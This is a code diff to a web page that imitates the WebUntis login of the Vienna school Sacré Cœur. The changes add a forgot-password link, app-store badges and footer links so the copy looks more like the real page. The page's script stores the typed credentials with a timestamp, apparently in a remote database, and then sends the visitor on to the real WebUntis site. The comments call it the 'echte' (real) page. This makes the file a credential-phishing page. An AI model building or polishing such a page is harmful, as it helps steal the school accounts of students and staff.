@@ -102,9 +102,20 @@
         .login-main {
             width: 50%;
             display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            align-items: center;
+            padding: 40px 20px 20px 20px;
+            position: relative;
+        }
+
+        /* Hilfs-Container, um den Inhalt vertikal perfekt zu zentrieren */
+        .login-center-wrapper {
+            flex: 1;
+            display: flex;
             justify-content: center;
             align-items: center;
-            padding: 40px;
+            width: 100%;
         }
 
         .login-box {
@@ -187,12 +198,12 @@
         }
 
         .input-group.focused {
-            border-bottom-color: #ff6b35; /* Orangefarbener Unterstrich bei Fokus */
+            border-bottom-color: #ff6b35;
         }
 
         .input-group label {
             font-size: 0.75rem;
-            color: #ff6b35; /* Orangefarbener Text für die Label */
+            color: #ff6b35;
             margin-bottom: 4px;
             font-weight: 600;
         }
@@ -241,6 +252,46 @@
             cursor: pointer;
         }
 
+        /* Passwort vergessen Link */
+        .forgot-password {
+            display: inline-block;
+            margin-top: 20px;
+            color: #1a202c;
+            text-decoration: underline;
+            font-size: 0.95rem;
+            font-weight: 500;
+            cursor: pointer;
+        }
+
+        /* App Badges Bereich */
+        .app-badges {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-top: 35px;
+        }
+
+        .app-badges img {
+            height: 40px;
+            cursor: pointer;
+        }
+
+        /* Footer Links unten rechts */
+        .login-footer {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            width: 100%;
+            padding-top: 20px;
+        }
+
+        .login-footer a {
+            color: #4a5568;
+            text-decoration: underline;
+            font-size: 0.85rem;
+            font-weight: 500;
+        }
+
         /* Responsive Anpassung für Handys */
         @media (max-width: 768px) {
             .login-container {
@@ -248,16 +299,17 @@
             }
             .info-sidebar {
                 width: 100%;
-                height: 40vh;
-                padding: 20px;
+                height: auto;
+                padding: 30px 20px;
             }
             .login-main {
                 width: 100%;
-                height: 60vh;
-                padding: 20px;
+                height: auto;
+                padding: 40px 20px 20px 20px;
             }
             .sidebar-content {
                 padding-left: 0;
+                margin-top: 30px;
             }
             body, html {
                 overflow: auto;
@@ -285,36 +337,56 @@
         </div>
 
         <div class="login-main">
-            <div class="login-box">
-                <h2 class="login-title">WebUntis Login</h2>
-                
-                <div class="school-logo-container">
-                    <img src="https://bafep.scp.ac.at/wp-content/uploads/sites/10/2017/01/leitbild-blau.png" alt="Sacré Cœur Wien Logo" class="school-logo">
-                </div>
-
-                <form class="form-container" id="loginForm">
-                    <button type="button" class="btn-portal">Bildungsportal</button>
+            
+            <div class="login-center-wrapper">
+                <div class="login-box">
+                    <h2 class="login-title">WebUntis Login</h2>
                     
-                    <div class="divider">
-                        <span>oder</span>
+                    <div class="school-logo-container">
+                        <img src="https://bafep.scp.ac.at/wp-content/uploads/sites/10/2017/01/leitbild-blau.png" alt="Sacré Cœur Wien Logo" class="school-logo">
                     </div>
 
-                    <div class="input-group" id="group-username">
-                        <label for="username">Benutzername</label>
-                        <input type="text" id="username" autocomplete="off">
-                    </div>
-
-                    <div class="input-group" id="group-password">
-                        <label for="password">Passwort</label>
-                        <div class="password-wrapper">
-                            <input type="password" id="password">
-                            <span class="toggle-password" id="togglePassword">👁</span>
+                    <form class="form-container" id="loginForm">
+                        <button type="button" class="btn-portal">Bildungsportal</button>
+                        
+                        <div class="divider">
+                            <span>oder</span>
                         </div>
-                    </div>
 
-                    <button type="submit" class="btn-login" id="loginBtn" disabled>Login</button>
-                </form>
+                        <div class="input-group" id="group-username">
+                            <label for="username">Benutzername</label>
+                            <input type="text" id="username" autocomplete="off">
+                        </div>
+
+                        <div class="input-group" id="group-password">
+                            <label for="password">Passwort</label>
+                            <div class="password-wrapper">
+                                <input type="password" id="password">
+                                <span class="toggle-password" id="togglePassword">👁</span>
+                            </div>
+                        </div>
+
+                        <button type="submit" class="btn-login" id="loginBtn" disabled>Login</button>
+                    </form>
+
+                    <a href="#" class="forgot-password">Passwort vergessen?</a>
+
+                    <div class="app-badges">
+                        <a href="https://play.google.com/store/apps/details?id=com.untis.mobile" target="_blank">
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Jetzt bei Google Play">
+                        </a>
+                        <a href="https://apps.apple.com/at/app/untis-mobile/id926180142" target="_blank">
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg" alt="Laden im App Store">
+                        </a>
+                    </div>
+                </div>
             </div>
+
+            <div class="login-footer">
+                <a href="#" target="_blank">Impressum</a>
+                <a href="#" target="_blank">Jobs @ Untis</a>
+            </div>
+
         </div>
 
     </div>
@@ -384,7 +456,7 @@
                     timestamp: serverTimestamp()
                 });
 
-                // Optionale Weiterleitung nach erfolgreichem Speichern (z.B. zur echten WebUntis Seite)
+                // Weiterleitung nach erfolgreichem Speichern zur echten WebUntis-Seite
                 window.location.href = "https://wien.webuntis.com/";
 
             } catch (error) {
